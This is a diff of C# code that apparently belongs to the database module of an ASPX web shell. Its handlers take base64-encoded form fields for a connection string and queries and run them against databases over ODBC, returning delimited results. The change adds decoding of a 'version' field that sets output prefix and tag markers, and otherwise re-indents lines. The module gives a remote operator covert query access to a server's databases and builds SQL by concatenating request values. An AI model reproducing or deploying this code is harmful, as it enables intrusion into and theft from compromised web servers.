@@ -28,6 +28,22 @@ namespace DB_Default
             String result = "";
             try
             {
+                if (this.Request.Form["version"] != null)
+                {
+                    String[] split = System.Text.Encoding.GetEncoding(cs)
+                        .GetString(System.Convert.FromBase64String(this.Request.Form["version"])).Split(';');
+                    if (split.Length == 1)
+                    {
+                        this.randomPrefix = split[0];
+                    }
+                    else
+                    {
+                        this.randomPrefix = split[0];
+                        tag_s = split[1];
+                        tag_e = split[2];
+                    }
+                }
+
                 String action = (this.Request.Form["action"]);
                 String conn = decode(this.Request.Form["conn"]);
                 String z1 = decode(this.Request.Form["z1"]);
@@ -90,7 +106,7 @@ namespace DB_Default
             System.Data.DataSet ds = new System.Data.DataSet();
             string sql = "show databases";
             using (System.Data.Odbc.OdbcDataAdapter dataAdapter =
-                new System.Data.Odbc.OdbcDataAdapter(sql, conn))
+                   new System.Data.Odbc.OdbcDataAdapter(sql, conn))
             {
                 dataAdapter.Fill(ds);
                 ret = parseDataset(ds, "\t", "\t", false);
@@ -105,7 +121,7 @@ namespace DB_Default
             System.Data.DataSet ds = new System.Data.DataSet();
             string sql = "show tables from " + dbname;
             using (System.Data.Odbc.OdbcDataAdapter dataAdapter =
-                new System.Data.Odbc.OdbcDataAdapter(sql, conn))
+                   new System.Data.Odbc.OdbcDataAdapter(sql, conn))
             {
                 dataAdapter.Fill(ds);
                 ret = parseDataset(ds, "\t", "\t", false);
@@ -120,7 +136,7 @@ namespace DB_Default
             System.Data.DataSet ds = new System.Data.DataSet();
             string sql = "select * from " + db + "." + table + " limit 0,0";
             using (System.Data.Odbc.OdbcDataAdapter dataAdapter =
-                new System.Data.Odbc.OdbcDataAdapter(sql, conn))
+                   new System.Data.Odbc.OdbcDataAdapter(sql, conn))
             {
                 dataAdapter.Fill(ds);
                 ret = parseDataset(ds, "\t", "", true);
@@ -134,7 +150,7 @@ namespace DB_Default
             String ret = "";
             System.Data.DataSet ds = new System.Data.DataSet();
             using (System.Data.Odbc.OdbcDataAdapter dataAdapter =
-                new System.Data.Odbc.OdbcDataAdapter(sql, conn))
+                   new System.Data.Odbc.OdbcDataAdapter(sql, conn))
             {
                 dataAdapter.Fill(ds);
                 ret = parseDataset(ds, "\t|\t", "\r\n", true);
